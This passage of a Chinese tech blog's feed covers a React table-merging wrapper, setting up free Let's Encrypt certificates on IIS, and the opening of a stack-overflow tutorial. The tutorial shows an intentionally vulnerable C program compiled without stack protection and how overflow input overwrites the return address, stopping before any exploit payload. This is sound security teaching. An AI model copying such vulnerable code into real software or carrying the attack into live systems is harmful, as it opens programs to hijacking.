                        &lt;span class=&quot;nx&quot;&gt;ii&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;
                    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                    &lt;span class=&quot;nx&quot;&gt;rowSpan&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ii&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;children&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;props&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rowSpan&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;column&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;render&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;

    &lt;span class=&quot;nx&quot;&gt;render&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;props&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;buildNewColumns&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;columns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pagination&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;props&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pageSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getPageSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pagination&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newColumns&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;buildNewColumns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;columns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pageSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Table&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{...&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;props&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;columns&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newColumns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;
&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getPageSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pagination&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pagination&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;typeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pagination&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'object'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pagination&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pageSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;以上封装方式其实也略嫌复杂，这主要是因为 Table 组件中 columns 中每列的 render 函数只传入了： value（当前值）、row（当前行） 以及 index（当前行索引） 这三个参数，开发人员可以在这个函数中使用当前单元格的数据、当前行的所有数据、以及当前行的位置这三个信息，但开发人员无法知道当前单元格位于哪一列，以及当前单元格相邻行的信息，其实很多场景下都需要这些信息（本文自动合并功能就是一个很典型的例子），如果 render 函数还可以传入： dataIndex（当前列索引） 和 dataSource（当前数据） 这两个参数，那本文的自动合并的功能其实可以很简单的实现，只需要给需要合并的列设置一个简单的 render 函数就可以了，而不需要像本文所用的方法这样对 Table 组件进行封装，对 columns 的 render 函数进行改写，以保证该 render 函数可以访问到当前的 dataSource 。&lt;/p&gt;</content><author><name></name></author><category term="[&quot;Front-end&quot;]" /><summary type="html">数据库查询时经常会使用到 group by 查询，对于此类查询返回的结果列表，用户往往会期望显示出来的表格能够合并 group by 字段对应的列。比如，对于下面的数据，期望 Department 和 Role 列能合并。</summary></entry><entry><title type="html">IIS 下申请、部署及自动更新免费 SSL 证书</title><link href="https://pandolia.net/maintenance/2019/03/05/letsencrypt-win-simple/" rel="alternate" type="text/html" title="IIS 下申请、部署及自动更新免费 SSL 证书" /><published>2019-03-05T00:00:00+08:00</published><updated>2019-03-05T00:00:00+08:00</updated><id>https://pandolia.net/maintenance/2019/03/05/letsencrypt-win-simple</id><content type="html" xml:base="https://pandolia.net/maintenance/2019/03/05/letsencrypt-win-simple/">&lt;p&gt;网站部署 HTTPS ，可以对浏览器和服务器之间的通讯数据进行加密，防止敏感信息（如：信用卡卡号、密码等）被中间攻击者窃取或篡改，防止网页内容被运行商或中间攻击者注入广告。此外， HTTPS 网站在搜索引擎中的排名也会比同等的 HTTP 网站更高。&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;部署 HTTPS 需要先给网站域名申请一个经权威机构认证的 SSL 证书，目前绝大部分认证机构的 SSL 证书都是收费的，而且收费都很高。不过目前美国公益组织 ISRG（Internet Security Research Group，互联网安全研究小组）的 &lt;a href=&quot;https://letsencrypt.org/&quot;&gt;Let’s Encrypt&lt;/a&gt; 上提供免费、自动化、开放的证书签发服务，对于一般的网站来说是够用了。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://letsencrypt.org/&quot;&gt;Let’s Encrypt&lt;/a&gt; 提供的证书有效期 90 天，但可以免费更新。它的主页上提供了很多自动申请、配置和更新的官方工具，但都是基于 Linux 类系统的。对于 Windows/IIS 服务器，github 上有一个非常智能和强大的工具： &lt;a href=&quot;https://github.com/PKISharp/win-acme&quot;&gt;letsencrypt-win-simple&lt;/a&gt; ，基本上可以做到一键自动申请、配置和更新证书。本文介绍如何使用这个工具给网站部署 HTTPS 。&lt;/p&gt;

&lt;p&gt;首先在 IIS 中部署好网站，将网站的主机名绑定为你的域名，带 www 的域名 www.xxx.com 、不带 www 的域名 xxx.com 、子域名 yyy.xxx.com 的格式都可以，一个网站可以绑定多个域名，也可以在一个系统中部署多个网站，但不同的网站必须绑定不同的域名。&lt;/p&gt;

&lt;p&gt;将所有域名都解析到服务器 ip 上，并在服务器的防火墙上开通 80 和 443 端口的外部访问。之后在本地浏览器中访问所有域名（ http://www.xxx.com 等），确保所有网站、所有域名都可以正常访问。注意这时用 https://www.xxx.com 是无法访问的。&lt;/p&gt;

&lt;p&gt;再到其 github 主页 &lt;a href=&quot;https://github.com/PKISharp/win-acme&quot;&gt;https://github.com/PKISharp/win-acme&lt;/a&gt; 的 &lt;a href=&quot;https://github.com/PKISharp/win-acme/releases&quot;&gt;release&lt;/a&gt; 页下载最新的 win-acme-v2.x.x.x.zip ，放到服务器上，解压并在服务器上运行其中的 wacs.exe ，有的系统可能会提示缺少某个 .net 运行环境，可以根据提示的网址，下载 NDP472-KB4054531-Web.exe 安装，如果服务器上无法下载可以先在本地下好再拷贝到服务器。&lt;/p&gt;

&lt;p&gt;运行 wacs.exe 后第一步有以下选项：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;N: Create new certificate
M: Create new certificate with advanced options
L: List scheduled renewals
R: Renew scheduled
S: Renew Specific
A: Renew *all*
O: More options...
Q: Quit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里直接回车，选第一个 “创建新证书” 。&lt;/p&gt;

&lt;p&gt;第二步有以下选项：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1: Single binding of an IIS site
2. SAN certificate for all bindings of an IIS site
3. SAN certificate for all bindings of multiple IIS sites
4: Manually input host names
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里选第三项“给所有网站创建证书”。&lt;/p&gt;

&lt;p&gt;之后就根据提示一步一步选择合适的选项就可以了，全部都完成后，程序会开始扫描出 IIS 下的所有网站和域名、验证域名的所有权、申请证书、给所有网站都配置好证书和 HTTPS 访问、并设置好自动检查和更新证书的计划任务，所有这一切都会自动的完成，完全不需要人工设置，相对智能和强大。&lt;/p&gt;

&lt;p&gt;完成后，在本地访问 https://www.xxx.com 可以发现网站已经可以正常用 HTTPS 协议访问了，这时浏览器地址栏开头已经多了一个神奇的“小锁”，点开这个小锁之后，就可以看到证书的详细信息，示例如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/image/ca.png&quot; alt=&quot;ca&quot; /&gt;&lt;/p&gt;

&lt;p&gt;打开 IIS 也可以看到，每个网站它都贴心的帮你绑定了带 HTTPS 的主机名 https://www.xxx.com 。&lt;/p&gt;

&lt;p&gt;证书里面最重要的信息一个是详细信息中的“使用者备用名称（DNS Name）”，这里面就包含了你的系统里面所有网站的域名，也就是这个证书所认证的域名，浏览器只有验证了证书的有效性以及用户所访问的网站的域名包含在证书上的 DNS Name 之后，才会允许后续的数据通讯。&lt;/p&gt;

&lt;p&gt;另一个重要信息是详细信息中的指纹算法和指纹，这个是你的证书的特有的指纹，建议记下这个指纹，你申请的证书也可以在其他服务器中使用（比如： nginx 服务器证书、 ftps 服务器证书或 ssh 服务器证书） 这时可以通过这个指纹来确保证书没有被中间攻击者替换。&lt;/p&gt;

&lt;p&gt;后面基本上就不需要做其他事情了，一切都由 wacs.exe 帮你搞定了，后续的证书过期前自动更新它也帮你搞定了，它自动增加了一个计划任务，每天 9 点自动检查证书是否即将过期，并自动更新即将过期的证书。&lt;/p&gt;

&lt;p&gt;如果需要在其他类型的服务器使用这个证书，可以在 IIS 主页中的“服务器证书”模块中，点右边操作栏的“导出证书”，设置好导出路径和密码，导出 pfx 文件。之后用 openssl 可以将 pfx 文件中的“私钥”和“证书信息”提取出来，命令为：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl pkcs12 -in a.pfx -out a.pem -nodes
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;提取之前需要输入导出时设置的密码。之后就可以在 a.pem 中看到 PRIVATE KEY 和 CERTIFICATE ，这两个也可以在其他的服务器中使用，只要你设置的服务器域名包含在证书中的域名就可以了，但要注意一定要保护好你的 PRIVATE KEY 。&lt;/p&gt;

&lt;p&gt;例如，可以在 ftp 服务器软件 FileZilla Server 中的 ftps 选项中，设定好 PRIVATE KEY FILE 和 CERTIFICATE FILE 后。在本地用 wincap 连接 ftps://www.xxx.com ，这时 wincap 和 FileZilla Server 之间就可以用 FTPS 协议来传递数据了，传递数据之前 FileZilla Server 会将证书发给 wincap ，而 wincap 会像浏览器一样验证证书和域名，确保证书不被中间攻击者替换，保证数据通讯的安全。&lt;/p&gt;

&lt;p&gt;注意：如果你在 wincap 中使用服务器 ip 而不是域名连接你的 ftp 服务器，这时 wincap 将认为该证书不是颁发给你所连接的服务器，它会打印出证书的指纹算法和指纹，让你自己选择是否相信此证书，此时，你可以人工对比该指纹和你的证书的指纹是否一致，如果一致，就表示证书在传输过程中未被替换，可以选择相信此证书。&lt;/p&gt;</content><author><name></name></author><category term="[&quot;Maintenance&quot;]" /><summary type="html">网站部署 HTTPS ，可以对浏览器和服务器之间的通讯数据进行加密，防止敏感信息（如：信用卡卡号、密码等）被中间攻击者窃取或篡改，防止网页内容被运行商或中间攻击者注入广告。此外， HTTPS 网站在搜索引擎中的排名也会比同等的 HTTP 网站更高。</summary></entry><entry><title type="html">栈溢出攻击及防护方法简介</title><link href="https://pandolia.net/security/2016/01/22/rop/" rel="alternate" type="text/html" title="栈溢出攻击及防护方法简介" /><published>2016-01-22T00:00:00+08:00</published><updated>2016-01-22T00:00:00+08:00</updated><id>https://pandolia.net/security/2016/01/22/rop</id><content type="html" xml:base="https://pandolia.net/security/2016/01/22/rop/">&lt;p&gt;如果你学的第一门程序语言是C语言，那么下面这段程序很可能是你写出来的第一个有完整的 “输入—处理—输出” 流程的程序：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

int main() {
    char name[64];
    printf(&quot;What's your name?&quot;);
    scanf(&quot;%s&quot;, name);
    printf(&quot;Hello, %s!\n&quot;, name);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;!--more--&gt;

&lt;p&gt;也许这段小程序给你带来了小小的成就感，也许直到课程结束也没人说这个程序有什么不对，也许你的老师在第一时间就指出这段代码存在&lt;strong&gt;栈溢出&lt;/strong&gt;的漏洞，也许你后来又看到无数的文章指出这个问题同时强调千万要慎用&lt;strong&gt;scanf&lt;/strong&gt;函数，也许你还知道&lt;strong&gt;stackoverflow&lt;/strong&gt;是最好的程序员网站。。。&lt;/p&gt;

&lt;p&gt;但可能从来没有人告诉你，什么是栈溢出、栈溢出有什么危害、黑客们可以利用栈溢出来进行什么样的攻击，还有你最想知道的，他们是如何利用栈溢出来实现攻击的，以及如何防护他们的攻击。&lt;/p&gt;

&lt;p&gt;本文将一一为你解答这些问题。&lt;/p&gt;

&lt;h3 id=&quot;1-准备工具及知识&quot;&gt;1. 准备工具及知识&lt;/h3&gt;

&lt;p&gt;你需要准备以下工具：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;一台64位Linux操作系统的x86计算机（虚拟机也可）&lt;/li&gt;
  &lt;li&gt;gcc编译器、gdb调试器以及nasm汇编器（安装命令：&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo apt-get install build-essential gdb nasm&lt;/code&gt;）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;本文中所有代码均在Debian8.1(amd64)、gcc4.9.2、gdb7.7.1和nasm2.11.05以下运行通过，如果你使用的版本不一致，编译选项和代码中的有关数值可能需要根据实际情况略作修改。&lt;/p&gt;

&lt;p&gt;你需要具备以下基础知识：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;熟练使用C语言、熟悉gcc编译器以及Linux操作系统&lt;/li&gt;
  &lt;li&gt;熟悉x86汇编，熟练使用mov, push, pop, jmp, call, ret, add, sub这几个常用命令&lt;/li&gt;
  &lt;li&gt;了解函数的调用过程以及调用约定&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;考虑到大部分学校里面使用的x86汇编教材都是32位、windows平台下的，这里简单介绍一下64位Linux平台下的汇编的不同之处（如果你已熟悉Linux下的X86-64汇编，那你可以跳过以下内容，直接阅读第2节）：&lt;/p&gt;

&lt;p&gt;第一个不同之处在于寄存器，64位的通用寄存器有rax, rbx, rcx, rdx, rsi, rdi, rbp, rsp, rip，对应32位的eax, ebx, ecx, edx, esi, edi, ebp, esp, eip，另外64位cpu中增加了r8, r9, r10, r11, r12, r13, r14, r15寄存器。&lt;/p&gt;

&lt;p&gt;第二个不同之处在于函数的调用约定，x86-32位架构下的函数调用一般通过栈来传递参数，而x86-64位架构下的函数调用的一般用rdi,rsi,rdx,rcx,r8和r9寄存器依次保存前6个整数型参数，浮点型参数保存在寄存器xmm0,xmm1…中，有更多的参数才通过栈来传递参数。&lt;/p&gt;

&lt;p&gt;第三个不同之处在于Linux系统特有的系统调用方式，Linux提供了许多很方便的系统调用（如write, read, open, fork, exec等），通过&lt;strong&gt;syscall&lt;/strong&gt;指令调用，由rax指定需要调用的系统调用编号，由rdi,rsi,rdx,r10,r9和r8寄存器传递系统调用需要的参数。Linux(x64)系统调用表详见 &lt;a href=&quot;http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64&quot;&gt;linux system call table for x86-64&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;Linux(x64)下的Hello world汇编程序如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[section .text]
    global _start

_start:
    mov rax, 1          ; the system call for write (&quot;1&quot; for sys_write)
    mov rdi, 1          ; file descriptor (&quot;1&quot; for standard output)
    mov rsi, Msg        ; string's address  
    mov rdx, 12         ; string's length
    syscall

    mov rax, 0x3c       ; the system call for exit(&quot;0x3c&quot; for sys_exit)
    mov rdi, 0          ; exit code
    syscall

Msg:
    DB &quot;Hello world!&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将以上代码另存为&lt;strong&gt;hello-x64.asm&lt;/strong&gt;，再在终端输入以下命令：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nasm -f elf64 hello-x64.asm
$ ld -s -o hello-x64 hello-x64.o
$ ./hello-x64
Hello world!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将编译生成可执行文件&lt;strong&gt;hello-x64&lt;/strong&gt;，并在终端输出&lt;strong&gt;Hello world!&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;另外，本文所有汇编都是用intel格式写的，为了使gdb显示intel格式的汇编指令，需在&lt;strong&gt;home&lt;/strong&gt;目录下新建一个&lt;strong&gt;.gdbinit&lt;/strong&gt;的文件，输入以下内容并保存：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;set disassembly-flavor intel
set disassemble-next-line on
display
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;2-经典的栈溢出攻击&quot;&gt;2. 经典的栈溢出攻击&lt;/h3&gt;

&lt;p&gt;现在回到最开始的这段程序：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

int main() {
    char name[64];
    printf(&quot;What's your name?&quot;);
    scanf(&quot;%s&quot;, name);
    printf(&quot;Hello, %s!\n&quot;, name);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将其另存为&lt;strong&gt;victim.c&lt;/strong&gt;，用gcc编译并运行：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gcc victim.c -o victim -zexecstack -g
$ ./victim 
What's your name?Jack
Hello, Jack!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;上面的编译选项中&lt;strong&gt;-g&lt;/strong&gt;表示输出调试信息，&lt;strong&gt;-zexecstack&lt;/strong&gt;的作用后面再说。先来仔细分析一下源程序，这段程序声明了一个长度为64的字节型数组，然后打印提示信息，再读取用户输入的名字，最后输出Hello和用户输入的名字。代码似乎没什么问题，name数组64个字节应该是够了吧？毕竟没人的姓名会有64个字母，毕竟我们的内存空间也是有限的。但是，往坏处想一想，没人能阻止用户在终端输入100甚至1000个的字符，当那种情况发生时，会发生什么事情？name数组只有64个字节的空间，那些多余的字符呢，会到哪里去？&lt;/p&gt;

&lt;p&gt;为了回答这两个问题，需要了解程序运行时name数组是如何保存在内存中的，这是一个局部变量，显然应该保存在栈上，那栈上的布局又是怎样的？让我们来分析一下程序中的汇编指令吧，先将目标程序的汇编码输出到&lt;strong&gt;victim.asm&lt;/strong&gt;文件中，命令如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;objdump -d victim -M intel &amp;gt; victim.asm
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后打开&lt;strong&gt;victim.asm&lt;/strong&gt;文件，找到其中的&lt;strong&gt;main&lt;/strong&gt;函数的代码：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0000000000400576 &amp;lt;main&amp;gt;:
  400576:   55                      push   rbp
  400577:   48 89 e5                mov    rbp,rsp
  40057a:   48 83 ec 40             sub    rsp,0x40
  40057e:   bf 44 06 40 00          mov    edi,0x400644
  400583:   b8 00 00 00 00          mov    eax,0x0
  400588:   e8 b3 fe ff ff          call   400440 &amp;lt;printf@plt&amp;gt;
  40058d:   48 8d 45 c0             lea    rax,[rbp-0x40]
  400591:   48 89 c6                mov    rsi,rax
  400594:   bf 56 06 40 00          mov    edi,0x400656
  400599:   b8 00 00 00 00          mov    eax,0x0
  40059e:   e8 cd fe ff ff          call   400470 &amp;lt;__isoc99_scanf@plt&amp;gt;
  4005a3:   48 8d 45 c0             lea    rax,[rbp-0x40]
  4005a7:   48 89 c6                mov    rsi,rax
  4005aa:   bf 59 06 40 00          mov    edi,0x400659
  4005af:   b8 00 00 00 00          mov    eax,0x0
  4005b4:   e8 87 fe ff ff          call   400440 &amp;lt;printf@plt&amp;gt;
  4005b9:   b8 00 00 00 00          mov    eax,0x0
  4005be:   c9                      leaved
  4005bf:   c3                      ret
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看出，main函数的开头和结尾和32位汇编中的函数几乎一样。该函数的开头的&lt;strong&gt;push rbp; mov rbp, rsp; sub rsp, 0x40&lt;/strong&gt;，先保存rbp的数值，再令rbp等于rsp，然后将栈顶指针rsp减小&lt;strong&gt;0x40&lt;/strong&gt;（也就是64），相当于在栈上分配长度为64的空间，main函数中只有name一个局部变量，显然这段空间就是name数组，即name的起始地址为&lt;strong&gt;rbp-0x40&lt;/strong&gt;。再结合函数结尾的&lt;strong&gt;leave; ret&lt;/strong&gt;，同时类比一下32位汇编中的函数栈帧布局，可以画出本程序中main函数的栈帧布局如下（请注意下图是按栈顶在上、栈底在下的方式画的）：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                     Stack
                +-------------+
                |     ...     |
                +-------------+
                |     ...     |
 name(-0x40)--&amp;gt; +-------------+
                |     ...     |
                +-------------+
                |     ...     |
                +-------------+
                |     ...     |
                +-------------+
                |     ...     |
  rbp(+0x00)--&amp;gt; +-------------+
                |   old rbp   |
     (+0x08)--&amp;gt; +-------------+ &amp;lt;--rsp points here just before `ret`
                |   ret rip   |
                +-------------+
                |     ...     |
                +-------------+
                |     ...     |
                +-------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;rbp&lt;/strong&gt;即函数的栈帧基指针，在main函数中，&lt;strong&gt;name&lt;/strong&gt;数组保存在&lt;strong&gt;rbp-0x40~rbp+0x00&lt;/strong&gt;之间，&lt;strong&gt;rbp+0x00&lt;/strong&gt;处保存的是&lt;strong&gt;上一个函数的rbp数值&lt;/strong&gt;，&lt;strong&gt;rbp+0x08&lt;/strong&gt;处保存了&lt;strong&gt;main函数的返回地址&lt;/strong&gt;。当main函数执行完&lt;strong&gt;leave&lt;/strong&gt;命令，执行到&lt;strong&gt;ret&lt;/strong&gt;命令时：上一个函数的rbp数值已重新取回至rbp寄存器，栈顶指针rsp已经指向了保存这个返回地址的单元。之后的&lt;strong&gt;ret&lt;/strong&gt;命令会将此地址出栈，然后跳到此地址。&lt;/p&gt;

&lt;p&gt;现在可以回答刚才那个问题了，如果用户输入了很多很多字符，会发生什么事情。此时&lt;strong&gt;scanf&lt;/strong&gt;函数会读取第一个空格字符之前的所有字符，然后全部拷贝到&lt;strong&gt;name&lt;/strong&gt;指向的地址处。若用户输入了100个“A”再回车，则栈会是下面这个样子：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                     Stack
                +-------------+
                |     ...     |
                +-------------+
                |     ...     |
 name(-0x40)--&amp;gt; +-------------+
                |   AAAAAAAA  |
                +-------------+
                |   AAAAAAAA  |
                +-------------+
                |   AAAAAAAA  |
                +-------------+
                |   AAAAAAAA  |
  rbp(+0x00)--&amp;gt; +-------------+
                |   AAAAAAAA  | (should be &quot;old rbp&quot;)
     (+0x08)--&amp;gt; +-------------+ &amp;lt;--rsp points here just before `ret`
